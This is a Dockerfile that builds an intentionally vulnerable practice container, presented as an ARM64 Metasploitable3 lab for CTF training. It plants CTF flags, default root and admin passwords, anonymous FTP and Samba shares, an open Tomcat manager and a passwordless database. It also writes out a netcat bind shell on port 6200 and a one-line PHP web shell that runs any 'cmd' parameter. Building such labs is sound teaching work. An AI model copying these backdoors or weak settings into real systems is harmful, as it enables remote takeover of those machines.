# =============================================================================
# Metasploitable3 ARM64 - Intentionally Vulnerable Lab
# Base: Ubuntu 22.04 LTS (ARM64 native / AMD64 via buildx)
#
# WARNING: FOR EDUCATIONAL/CTF USE ONLY.
# NEVER EXPOSE TO PUBLIC NETWORKS OR THE INTERNET.
# =============================================================================
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive \
    TZ=UTC \
    JAVA_HOME=/usr/lib/jvm/default-java \
    CATALINA_HOME=/usr/share/tomcat9

# -----------------------------------------------------------------------------
# SYSTEM PACKAGES
# -----------------------------------------------------------------------------
RUN apt-get update && apt-get install -y --no-install-recommends \
    # Process manager
    supervisor \
    # Network tools
    net-tools iputils-ping curl wget netcat-openbsd \
    # SSH
    openssh-server \
    # FTP
    vsftpd \
    # Web stack
    apache2 php php-mysql php-gd php-curl php-xml php-pdo libapache2-mod-php \
    # Database
    mariadb-server \
    # Samba
    samba \
    # Java / Tomcat
    default-jdk-headless tomcat9 tomcat9-admin \
    # Utilities
    git unzip sudo \
    && rm -rf /var/lib/apt/lists/*

# -----------------------------------------------------------------------------
# CTF FLAGS
# -----------------------------------------------------------------------------
RUN echo "FLAG{root_owned_d4rk_pwn3d}"       > /root/flag.txt \
    && chmod 600 /root/flag.txt \
    && mkdir -p /srv/ftp/pub \
    && echo "FLAG{ftp_anon_access_gr4nted}"   > /srv/ftp/flag.txt \
    && chmod 644 /srv/ftp/flag.txt \
    && mkdir -p /srv/samba/public \
    && echo "FLAG{smb_sh4r3_pwn3d}"           > /srv/samba/public/flag.txt \
    && chmod 0777 /srv/samba/public

# -----------------------------------------------------------------------------
# USER SETUP
# -----------------------------------------------------------------------------
RUN useradd -m -s /bin/bash msfadmin \
    && echo 'root:root'          | chpasswd \
    && echo 'msfadmin:msfadmin'  | chpasswd \
    && usermod -aG sudo msfadmin

# -----------------------------------------------------------------------------
# SSH — insecure: root login, password auth, no host key check
# -----------------------------------------------------------------------------
COPY config/ssh/sshd_config /etc/ssh/sshd_config
COPY config/ssh/banner       /etc/ssh/banner
RUN mkdir -p /var/run/sshd && ssh-keygen -A

# -----------------------------------------------------------------------------
# FTP — vsftpd with anonymous login
# Backdoor 2.3.4 is x86-only; emulated via nc bind shell on port 6200
# -----------------------------------------------------------------------------
COPY config/vsftpd/vsftpd.conf /etc/vsftpd.conf
RUN chown -R ftp:ftp /srv/ftp \
    && echo "Test file for anonymous FTP" > /srv/ftp/pub/readme.txt \
    && printf '#!/bin/bash\nnc -lkp 6200 -e /bin/bash &\n' \
       > /usr/local/bin/backdoor-sim \
    && chmod +x /usr/local/bin/backdoor-sim

# -----------------------------------------------------------------------------
# APACHE + DVWA
# -----------------------------------------------------------------------------
RUN rm -rf /var/www/html/* \
    && git clone --depth 1 https://github.com/digininja/DVWA.git /var/www/html/dvwa \
    && ln -s /var/www/html/dvwa /var/www/html/DVWA

COPY config/dvwa/config.inc.php /var/www/html/dvwa/config/config.inc.php

RUN a2enmod rewrite \
    && echo "ServerName localhost" >> /etc/apache2/apache2.conf \
    && sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf \
    && chown -R www-data:www-data /var/www/html \
    && chmod -R 777 /var/www/html

# RCE shell on port 8585
RUN mkdir -p /var/www/rce-shell \
    && echo '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>' \
       > /var/www/rce-shell/shell.php \
    && chown -R www-data:www-data /var/www/rce-shell

COPY config/apache/rce-shell.conf /etc/apache2/sites-available/rce-shell.conf
RUN echo "Listen 8585" >> /etc/apache2/ports.conf \
    && a2ensite rce-shell.conf

# Flag accessible via web
RUN echo "FLAG{w3b_s3rv3r_c0mpr0m1s3d}" > /var/www/html/flag.txt

# -----------------------------------------------------------------------------
# MARIADB — root with no password, external connections allowed
# DB init handled by entrypoint.sh at first container start
# -----------------------------------------------------------------------------
COPY config/mariadb/99-insecure.cnf /etc/mysql/mariadb.conf.d/99-insecure.cnf
RUN mkdir -p /var/run/mysqld && chown mysql:mysql /var/run/mysqld

# -----------------------------------------------------------------------------
# TOMCAT 9 — default credentials, manager app unrestricted
# -----------------------------------------------------------------------------
COPY config/tomcat/tomcat-users.xml /etc/tomcat9/tomcat-users.xml
COPY config/tomcat/context.xml       /etc/tomcat9/context.xml
RUN chown -R tomcat:tomcat /etc/tomcat9

# -----------------------------------------------------------------------------
# SAMBA — anonymous share + CVE-2007-2447 simulation via username map script
# -----------------------------------------------------------------------------
COPY config/samba/smb.conf /etc/samba/smb.conf
RUN useradd -M -s /sbin/nologin smbuser 2>/dev/null || true \
    && (echo ""; echo "") | smbpasswd -a -s smbuser \
    && smbpasswd -e smbuser \
    && chmod 0777 /srv/samba/public \
    && echo "Samba public share — Metasploitable3 Lab" > /srv/samba/public/README.txt

# -----------------------------------------------------------------------------
# SUPERVISORD + ENTRYPOINT
# -----------------------------------------------------------------------------
COPY supervisord.conf /etc/supervisor/conf.d/metasploitable.conf
COPY entrypoint.sh    /entrypoint.sh
RUN chmod +x /entrypoint.sh

# -----------------------------------------------------------------------------
# PORTS
# -----------------------------------------------------------------------------
EXPOSE 21 22 80 139 445 3306 6200 8080 8585

ENTRYPOINT ["/entrypoint.sh"]
CMD ["/usr/bin/supervisord", "-n", "-c", "/etc/supervisor/supervisord.conf"]
